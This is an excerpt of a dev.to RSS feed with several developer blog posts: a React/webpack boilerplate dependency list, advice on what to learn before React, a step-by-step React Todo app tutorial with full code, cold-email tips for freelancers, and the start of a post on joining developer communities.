&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://reactjs.org/"&gt;React&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://webpack.js.org/"&gt;webpack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tailwindcss.com"&gt;Tailwind 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://postcss.org/"&gt;PostCss&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://babeljs.io/"&gt;Babel&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://sass-lang.com/"&gt;Sass&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://eslint.org/"&gt;Eslint&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#dependencies" class="anchor"&gt;
  &lt;/a&gt;
  Dependencies
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#webpack" class="anchor"&gt;
  &lt;/a&gt;
  webpack
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://github.com/webpack/webpack"&gt;&lt;code&gt;webpack&lt;/code&gt;&lt;/a&gt; - Module and asset bundler.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/webpack/webpack-cli"&gt;&lt;code&gt;webpack-cli&lt;/code&gt;&lt;/a&gt; - Command line interface for webpack&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/webpack/webpack-dev-server"&gt;&lt;code&gt;webpack-dev-server&lt;/code&gt;&lt;/a&gt; - Development server for webpack&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/survivejs/webpack-merge"&gt;&lt;code&gt;webpack-merge&lt;/code&gt;&lt;/a&gt; - Simplify development/production configuration&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/kentcdodds/cross-env"&gt;&lt;code&gt;cross-env&lt;/code&gt;&lt;/a&gt; - Cross platform configuration&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#babel" class="anchor"&gt;
  &lt;/a&gt;
  Babel
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://www.npmjs.com/package/@babel/core"&gt;&lt;code&gt;@babel/core&lt;/code&gt;&lt;/a&gt; - Transpile ES6+ to backwards compatible JavaScript&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://babeljs.io/docs/en/babel-plugin-proposal-class-properties"&gt;&lt;code&gt;@babel/plugin-proposal-class-properties&lt;/code&gt;&lt;/a&gt; - Use properties directly on a class (an example Babel config)&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://babeljs.io/docs/en/babel-preset-env"&gt;&lt;code&gt;@babel/preset-env&lt;/code&gt;&lt;/a&gt; - Smart defaults for Babel&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#loaders" class="anchor"&gt;
  &lt;/a&gt;
  Loaders
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://webpack.js.org/loaders/babel-loader/"&gt;&lt;code&gt;babel-loader&lt;/code&gt;&lt;/a&gt; - Transpile files with Babel and webpack&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://webpack.js.org/loaders/sass-loader/"&gt;&lt;code&gt;sass-loader&lt;/code&gt;&lt;/a&gt; - Load SCSS and compile to CSS&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/sass/node-sass"&gt;&lt;code&gt;node-sass&lt;/code&gt;&lt;/a&gt; - Node Sass&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://webpack.js.org/loaders/css-loader/"&gt;&lt;code&gt;css-loader&lt;/code&gt;&lt;/a&gt; - Resolve CSS imports&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://webpack.js.org/loaders/postcss-loader/"&gt;&lt;code&gt;postcss-loader&lt;/code&gt;&lt;/a&gt; - Loader to process CSS with PostCSS&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://webpack.js.org/loaders/style-loader/"&gt;&lt;code&gt;style-loader&lt;/code&gt;&lt;/a&gt; - Inject CSS into the DOM&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#eslint" class="anchor"&gt;
  &lt;/a&gt;
  Eslint
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://www.npmjs.com/package/eslint-config-prettier"&gt;&lt;code&gt;eslint-config-prettier&lt;/code&gt;&lt;/a&gt; - Turns off all rules that are unnecessary or might conflict with Prettier.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.npmjs.com/package/eslint-import-resolver-alias"&gt;&lt;code&gt;eslint-import-resolver-alias&lt;/code&gt;&lt;/a&gt; - a simple Node behavior import resolution plugin for eslint-plugin-import, supporting module alias.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.npmjs.com/package/eslint-plugin-babel"&gt;&lt;code&gt;eslint-plugin-babel&lt;/code&gt;&lt;/a&gt; - an eslint rule plugin companion to babel-eslint.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.npmjs.com/package/eslint-plugin-import"&gt;&lt;code&gt;eslint-plugin-import&lt;/code&gt;&lt;/a&gt; - This plugin intends to support linting of ES2015+ (ES6+) import/export syntax, and prevent issues with misspelling of file paths and import names.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.npmjs.com/package/eslint-plugin-prettier"&gt;&lt;code&gt;eslint-plugin-prettier&lt;/code&gt;&lt;/a&gt; - Runs prettier as an eslint rule.&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://www.npmjs.com/package/eslint-plugin-react"&gt;&lt;code&gt;eslint-plugin-react&lt;/code&gt;&lt;/a&gt; - React specific linting rules for ESLint.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#plugins" class="anchor"&gt;
  &lt;/a&gt;
  Plugins
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://github.com/johnagan/clean-webpack-plugin"&gt;&lt;code&gt;clean-webpack-plugin&lt;/code&gt;&lt;/a&gt; - Remove/clean build folders&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/webpack-contrib/copy-webpack-plugin"&gt;&lt;code&gt;copy-webpack-plugin&lt;/code&gt;&lt;/a&gt; - Copy files to build directory&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/jantimon/html-webpack-plugin"&gt;&lt;code&gt;html-webpack-plugin&lt;/code&gt;&lt;/a&gt; - Generate HTML files from template&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/webpack-contrib/mini-css-extract-plugin"&gt;&lt;code&gt;mini-css-extract-plugin&lt;/code&gt;&lt;/a&gt; - Extract CSS into separate files&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/NMFR/optimize-css-assets-webpack-plugin"&gt;&lt;code&gt;optimize-css-assets-webpack-plugin&lt;/code&gt;&lt;/a&gt; - Optimize and minimize CSS assets&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/webpack-contrib/terser-webpack-plugin"&gt;&lt;code&gt;terser-webpack-plugin&lt;/code&gt;&lt;/a&gt; - Optimize and minimize JavaScript&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Cheers&lt;br&gt;
&lt;a href="https://altafino.com"&gt;Stefan - Fullstack Developer - Go/JS&lt;/a&gt;&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>react</category>
      <category>showdev</category>
    </item>
    <item>
      <title>What to learn before learning React</title>
      <author>stephanieopala</author>
      <pubDate>Sun, 03 Jan 2021 05:28:23 +0000</pubDate>
      <link>https://dev.to/stephanieopala/what-to-learn-before-learning-react-1a6h</link>
      <guid>https://dev.to/stephanieopala/what-to-learn-before-learning-react-1a6h</guid>
      <description>&lt;p&gt;I am currently learning React( A JavaScript library) and here are a few prerequisites before diving into the JavaScript library.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;BASIC HTML AND CSS&lt;/strong&gt;&lt;br&gt;
You should have a basic understanding of HTML and CSS. Knowing how to write HTML sematic tags will make it easier to grasp the concepts of JSX(a JavaScript syntax extension) used in React. Besides that, you should learn how CSS is used in styling and in responsive web applications.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;VERSION CONTROL(GIT AND GITHUB)&lt;/strong&gt;&lt;br&gt;
Git is an open source version control tool that lets you manage and keep track of your code and GitHub on the other hand, is a code hosting platform for version control and enables collaboration among developers.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;VANILLA JAVASCRIPT&lt;/strong&gt;&lt;br&gt;
Before jumping into a JavaScript library or framework, it is a good idea to learn the vanilla JavaScript. Below is a list of JavaScript features that you should learn before learning React.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;General JavaScript features(variables, functions, datatypes, conditional statements e.t.c)&lt;/li&gt;
&lt;li&gt;Modern JavaScript features/ES6

&lt;ul&gt;
&lt;li&gt;ES6 classes&lt;/li&gt;
&lt;li&gt;The new variable declaration let/const&lt;/li&gt;
&lt;li&gt;Arrow functions&lt;/li&gt;
&lt;li&gt;Destructuring assignment&lt;/li&gt;
&lt;li&gt;Array functions especially Map and filter&lt;/li&gt;
&lt;li&gt;ES6 modules&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Happy coding!&lt;/p&gt;

</description>
      <category>codenewbie</category>
      <category>react</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Build a Todo App with React</title>
      <author>Kumar Shubham</author>
      <pubDate>Sun, 03 Jan 2021 03:45:27 +0000</pubDate>
      <link>https://dev.to/shubham1710/build-a-todo-app-with-react-9la</link>
      <guid>https://dev.to/shubham1710/build-a-todo-app-with-react-9la</guid>
      <description>&lt;p&gt;Hello readers! This is the first time I am writing an article on building something with React. So, I am also new to React and Frontend Frameworks. And the best way to make your first React project would be to make a simple Todo App.&lt;/p&gt;

&lt;p&gt;Building a Todo App is easy and does not take much time but it teaches you some important concepts. It teaches you the principle of CRUD (Create, Read, Update and Delete) which are very important to understand for any developer.&lt;/p&gt;

&lt;p&gt;Since this is our first project in the React world, we would keep things simple. We won’t be using Redux for state management and we would not use any kind of server to manage it.&lt;/p&gt;

&lt;p&gt;Building a simple Todo list means we won’t be able to keep track of the todos once we refresh the page. So, it is not a perfect solution but a good start.&lt;/p&gt;

&lt;p&gt;We will learn to build an advanced Todo App which would involve Redux and a server but for now, we would like to keep things simple. We would build a simple working React app with some styling.&lt;/p&gt;

&lt;p&gt;So, let’s begin:-&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#setting-up-the-project" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Setting up the Project&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;So, let’s start building our first React Todo app. We would be using create-react-app to help us bootstrap the React App for us.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;npm install create-react-app&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Running the above command would install create-react-app in our project. Now, this would be ready for use.&lt;/p&gt;

&lt;p&gt;To create a new project named ‘todo’, we would run the command as follows:-&lt;/p&gt;

&lt;p&gt;&lt;code&gt;create-react-app todo&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now, this would create a folder named ‘todo’ in our current repository. Next, we should move inside the todo folder by doing:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;cd todo&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now, we will install two libraries using npm which would help us with using the Bootstrap library in our app to apply the styling.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;npm install react-bootstrap bootstrap&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Running the above command will install both react-bootstrap and bootstrap libraries in our application.&lt;/p&gt;

&lt;p&gt;Now, we are ready to build the app.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#appcs" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;App.cs&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;Now, let’s write some custom CSS code to do some styling. Do not worry about this part. It is very simple styling to make our Todo app look a bit nicer.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;.app {
  padding: 30px;
  background-color: floralwhite;
}

.todo {
  align-items: center;
  display: flex;
  font-size: 18px;
  justify-content: space-between;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;We will do the rest of the styling using react-bootstrap components.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#appjs" class="anchor"&gt;
  &lt;/a&gt;
  &lt;strong&gt;App.js&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;Next, we will start with the main part, the App.js file. We will start by importing the required things in our App.js file.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import React from "react";
import "./App.css";
import { Button, Card, Form } from 'react-bootstrap';
import 'bootstrap/dist/css/bootstrap.min.css';
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;We will use React Hooks to allow us to replace the class-based components with functional components and still use all features without any issues.&lt;/p&gt;

&lt;p&gt;So, we start with the main function of the App. We will define a todos javascript list which would contain all our todos and also carries the status of each todo whether they are done or not. We will use setTodos and will use React.useState which is enabled by React Hooks.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function App() {
  const [todos, setTodos] = React.useState([
    {
      text: "This is a sampe todo",
      isDone: false
    }
  ]);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Next, we move to the part of adding todos. We will define an addTodo function and will define a newTodos which would take the todos list and append the new todo’s text to the list using the spread operator. We then use setTodos to set newTodos as todos.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const addTodo = text =&amp;gt; {
    const newTodos = [...todos, { text }];
    setTodos(newTodos);
  };
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Next, we move to the part of marking Todos as done. We will define a markTodo function. We use the spread operator to copy all the todos in newTodos and then we mark the todo as done by using its index and then we set the newTodos as todos.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const markTodo = index =&amp;gt; {
    const newTodos = [...todos];
    newTodos[index].isDone = true;
    setTodos(newTodos);
  };
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Next, we move the part of deleting the todos. In the same way, this time we use the index to splice the list and remove the todo whose index matches and then we set the new todos.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const removeTodo = index =&amp;gt; {
    const newTodos = [...todos];
    newTodos.splice(index, 1);
    setTodos(newTodos);
  };
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;We then finish off the App function by returning the JSX rendering which would be displayed on the website. We are using a FormTodo component which we will define later on. It accepts the addTodo as a parameter.&lt;/p&gt;

&lt;p&gt;Then we display all the todos using the map operator. For each todo, we will pass it to the Todo component (will define later). We send the index, todo, the markTodo and removeTodo functions.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;return (
    &amp;lt;div className="app"&amp;gt;
      &amp;lt;div className="container"&amp;gt;
        &amp;lt;h1 className="text-center mb-4"&amp;gt;Todo List&amp;lt;/h1&amp;gt;
        &amp;lt;FormTodo addTodo={addTodo} /&amp;gt;
        &amp;lt;div&amp;gt;
          {todos.map((todo, index) =&amp;gt; (
            &amp;lt;Card&amp;gt;
              &amp;lt;Card.Body&amp;gt;
                &amp;lt;Todo
                key={index}
                index={index}
                todo={todo}
                markTodo={markTodo}
                removeTodo={removeTodo}
                /&amp;gt;
              &amp;lt;/Card.Body&amp;gt;
            &amp;lt;/Card&amp;gt;
          ))}
        &amp;lt;/div&amp;gt;
      &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
  );
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Now, we will define the Todo component. It accepts the four parameters which we passed on earlier when we called the Todo component.&lt;/p&gt;

&lt;p&gt;We return some JSX which would show each Todo. It will also show two buttons for marking Todos as Done and for removing the Todo respectively.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function Todo({ todo, index, markTodo, removeTodo }) {
  return (
    &amp;lt;div
      className="todo"

    &amp;gt;
      &amp;lt;span style={{ textDecoration: todo.isDone ? "line-through" : "" }}&amp;gt;{todo.text}&amp;lt;/span&amp;gt;
      &amp;lt;div&amp;gt;
        &amp;lt;Button variant="outline-success" onClick={() =&amp;gt; markTodo(index)}&amp;gt;✓&amp;lt;/Button&amp;gt;{' '}
        &amp;lt;Button variant="outline-danger" onClick={() =&amp;gt; removeTodo(index)}&amp;gt;✕&amp;lt;/Button&amp;gt;
      &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
  );
}
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Next, we would define the FormTodo function. It accepts the addTodo as a parameter. It handles the submission of a new Todo. If the value is not empty, then we call the addTodo function on that todo text and then set the value of the form to empty again.&lt;/p&gt;

&lt;p&gt;We return a form which accepts a Todo and has a Submit button for submission of the todos. Clicking on the submit button would add the Todo in the Todo list.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function FormTodo({ addTodo }) {
  const [value, setValue] = React.useState("");

  const handleSubmit = e =&amp;gt; {
    e.preventDefault();
    if (!value) return;
    addTodo(value);
    setValue("");
  };

  return (
    &amp;lt;Form onSubmit={handleSubmit}&amp;gt; 
    &amp;lt;Form.Group&amp;gt;
      &amp;lt;Form.Label&amp;gt;&amp;lt;b&amp;gt;Add Todo&amp;lt;/b&amp;gt;&amp;lt;/Form.Label&amp;gt;
      &amp;lt;Form.Control type="text" className="input" value={value} onChange={e =&amp;gt; setValue(e.target.value)} placeholder="Add new todo" /&amp;gt;
    &amp;lt;/Form.Group&amp;gt;
    &amp;lt;Button variant="primary mb-3" type="submit"&amp;gt;
      Submit
    &amp;lt;/Button&amp;gt;
  &amp;lt;/Form&amp;gt;
  );
}
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Now, let’s have a look at the complete App.js file:-&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import React from "react";
import "./App.css";
import { Button, Card, Form } from 'react-bootstrap';
import 'bootstrap/dist/css/bootstrap.min.css';


function Todo({ todo, index, markTodo, removeTodo }) {
  return (
    &amp;lt;div
      className="todo"

    &amp;gt;
      &amp;lt;span style={{ textDecoration: todo.isDone ? "line-through" : "" }}&amp;gt;{todo.text}&amp;lt;/span&amp;gt;
      &amp;lt;div&amp;gt;
        &amp;lt;Button variant="outline-success" onClick={() =&amp;gt; markTodo(index)}&amp;gt;✓&amp;lt;/Button&amp;gt;{' '}
        &amp;lt;Button variant="outline-danger" onClick={() =&amp;gt; removeTodo(index)}&amp;gt;✕&amp;lt;/Button&amp;gt;
      &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
  );
}

function FormTodo({ addTodo }) {
  const [value, setValue] = React.useState("");

  const handleSubmit = e =&amp;gt; {
    e.preventDefault();
    if (!value) return;
    addTodo(value);
    setValue("");
  };

  return (
    &amp;lt;Form onSubmit={handleSubmit}&amp;gt; 
    &amp;lt;Form.Group&amp;gt;
      &amp;lt;Form.Label&amp;gt;&amp;lt;b&amp;gt;Add Todo&amp;lt;/b&amp;gt;&amp;lt;/Form.Label&amp;gt;
      &amp;lt;Form.Control type="text" className="input" value={value} onChange={e =&amp;gt; setValue(e.target.value)} placeholder="Add new todo" /&amp;gt;
    &amp;lt;/Form.Group&amp;gt;
    &amp;lt;Button variant="primary mb-3" type="submit"&amp;gt;
      Submit
    &amp;lt;/Button&amp;gt;
  &amp;lt;/Form&amp;gt;
  );
}

function App() {
  const [todos, setTodos] = React.useState([
    {
      text: "This is a sampe todo",
      isDone: false
    }
  ]);

  const addTodo = text =&amp;gt; {
    const newTodos = [...todos, { text }];
    setTodos(newTodos);
  };

  const markTodo = index =&amp;gt; {
    const newTodos = [...todos];
    newTodos[index].isDone = true;
    setTodos(newTodos);
  };

  const removeTodo = index =&amp;gt; {
    const newTodos = [...todos];
    newTodos.splice(index, 1);
    setTodos(newTodos);
  };

  return (
    &amp;lt;div className="app"&amp;gt;
      &amp;lt;div className="container"&amp;gt;
        &amp;lt;h1 className="text-center mb-4"&amp;gt;Todo List&amp;lt;/h1&amp;gt;
        &amp;lt;FormTodo addTodo={addTodo} /&amp;gt;
        &amp;lt;div&amp;gt;
          {todos.map((todo, index) =&amp;gt; (
            &amp;lt;Card&amp;gt;
              &amp;lt;Card.Body&amp;gt;
                &amp;lt;Todo
                key={index}
                index={index}
                todo={todo}
                markTodo={markTodo}
                removeTodo={removeTodo}
                /&amp;gt;
              &amp;lt;/Card.Body&amp;gt;
            &amp;lt;/Card&amp;gt;
          ))}
        &amp;lt;/div&amp;gt;
      &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
  );
}

export default App;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;In this way, we had built our simple Todo App. You can try out this simple React Todo which we have built on &lt;a href="https://shubham1710.github.io/React-Todo/"&gt;this website hosted on Github pages&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;You can access the &lt;a href="https://github.com/shubham1710/React-Todo"&gt;GitHub repository&lt;/a&gt; of this article and see the complete package structure and code.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Originally published at &lt;a href="https://dev.to/shubham1710/build-a-todo-app-with-react-9la"&gt;JS in Plain English here!&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

</description>
      <category>react</category>
      <category>javascript</category>
      <category>firstpost</category>
      <category>programming</category>
    </item>
    <item>
      <title>How to improve your cold email outreach while freelancing</title>
      <author>CoderSales.io</author>
      <pubDate>Sat, 02 Jan 2021 21:27:47 +0000</pubDate>
      <link>https://dev.to/coder_sales/how-to-improve-your-cold-email-outreach-while-freelancing-onj</link>
      <guid>https://dev.to/coder_sales/how-to-improve-your-cold-email-outreach-while-freelancing-onj</guid>
      <description>&lt;p&gt;GOOD SUBJECT LINE&lt;/p&gt;

&lt;p&gt;So we’ve played around with this for over a year and got the best open rate (over 40%) with the simple subject line ‘Question’. Perhaps it is a bit old now BUT continues to work. Why reinvent the wheel? You want something short, sweet and will make the person on the other end curious as to why they should open it.  And that's the end goal =&amp;gt; curiosity =&amp;gt; open email.  &lt;/p&gt;

&lt;p&gt;A GOOD HOOK&lt;/p&gt;

&lt;p&gt;A good hook meaning that you presented something that they want up front – ‘we noticed a few mistakes you are making on your website (conversion points, UI etc) but would you be the person to chat further about it?’ Hook them with a pain point, that they’re making a mistake and have a call to action that if they want to fix it, get back to you. Present the problem and the solution. Go straight to the CEO.&lt;/p&gt;

&lt;p&gt;FIND COMMON GROUND&lt;/p&gt;

&lt;p&gt;“We work with companies like yours already and have produced tremendous websites that have increased traffic/conversions by XX%”. That way, they know you know a bit of the industry you’re in, perhaps have a lay of the land and can hold a conversation with them about what’s important to them. 3rd party verification is a strong way to puff your chest and convey your stature over cold email which triggers interest and action – include 2 links of previous jobs you’ve done and how you can make theirs better.&lt;/p&gt;

&lt;p&gt;URGENCY&lt;/p&gt;

&lt;p&gt;Back to urgency again. Yup, that’s what makes people buy. I once sent a cold email to a major university saying we’re on deadline for our Winter issue (back when I was selling advertising in a magazine) and have a remnant spot available. I attached a piece of their artwork in the email and mentioned how it would be a great fit in our cyber security section. THEY VERY NEXT MORNING a project manager literally called the office and asked to talk to me – she said she was asked by the DM to follow up with the ad purchase because our deadline was today. She said we’ll take the ad… then asked how much it was. Use urgency in your emails to get quick responses and blast this out to your target once a quarter.&lt;/p&gt;

&lt;p&gt;PERSONALIZE IT&lt;/p&gt;

&lt;p&gt;These dm’s got crushed with cold email every single days from pigeons trying to sell them everything you can imagine. ‘Greetings of the day!’. No, don’t do that. Use the prospect’s first name and why you thought of them. What can you do for them? Improve their website will do what for them? What is the end results? I also include what their competitor is doing and how this will outrank them… that usually gets a reaction. A lot of times people make decisions on fear and FOMO so bring up a competitor.... which is another good reason why you should niche down. &lt;/p&gt;

&lt;p&gt;&lt;a href="http://www.codersales.io"&gt;www.codersales.io&lt;/a&gt;&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>beginners</category>
      <category>career</category>
      <category>iknowguacisextra</category>
    </item>
    <item>
      <title>Start the Year Strong, Join a Dev Community</title>
      <author>Allison Cortez</author>
      <pubDate>Sat, 02 Jan 2021 20:15:03 +0000</pubDate>
      <link>https://dev.to/allisoncortez/start-the-year-strong-join-a-dev-community-2pdn</link>
      <guid>https://dev.to/allisoncortez/start-the-year-strong-join-a-dev-community-2pdn</guid>
      <description>&lt;p&gt;Getting involved with a community has been essential to my journey as a developer. It's advice I got early on, and something I would like to pass along to others.&lt;/p&gt;

&lt;p&gt;A quick note: I'm a Mexican-American lady, originally from Texas. I would say that the communities I've joined are definitely geared towards my demographic.&lt;br&gt;
&lt;a href="https://i.giphy.com/media/lTecNFkWIEz5kaGbvS/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/lTecNFkWIEz5kaGbvS/giphy.gif" alt="friends"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#getting-involved-with-a-community-could-be-daunting-at-first" class="anchor"&gt;
  &lt;/a&gt;
  Getting involved with a community could be daunting at first.
&lt;/h4&gt;

&lt;p&gt;Not sure where to start? &lt;br&gt;
&lt;a href="https://i.giphy.com/media/WzCZU1PbrmfZu/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/WzCZU1PbrmfZu/giphy.gif" alt="eek"&gt;&lt;/a&gt;&lt;br&gt;
Here are some great first action steps:&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#go-to-meetups" class="anchor"&gt;
  &lt;/a&gt;
  Go to Meetups
&lt;/h1&gt;

&lt;p&gt;This is especially true for our post-pandemic world. Even though it's definitely not the same as in-person, It's a great way to get connected with your local community, or even join some nationwide groups. &lt;/p&gt;

&lt;p&gt;You can learn something new, sign up for lightning talks, join a more non-formal happy hour setting, or attend a traditional workshop. There are so many different types of formats when it comes to Meetup groups, you're bound to find something that sparks your interest.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#join-a-slack" class="anchor"&gt;
  &lt;/a&gt;
  Join a Slack
&lt;/h1&gt;

&lt;p&gt;Similar to Discord, Slack is an online community where you can join specific groups and channels that you're interested in. It's a great way to meet new people and chat in a more direct way with members within your group. Here are a few slacks I've thoroughly enjoyed being apart of: &lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#women-who-code" class="anchor"&gt;
  &lt;/a&gt;
  &lt;a href="https://www.womenwhocode.com/"&gt;Women Who Code&lt;/a&gt;
&lt;/h4&gt;

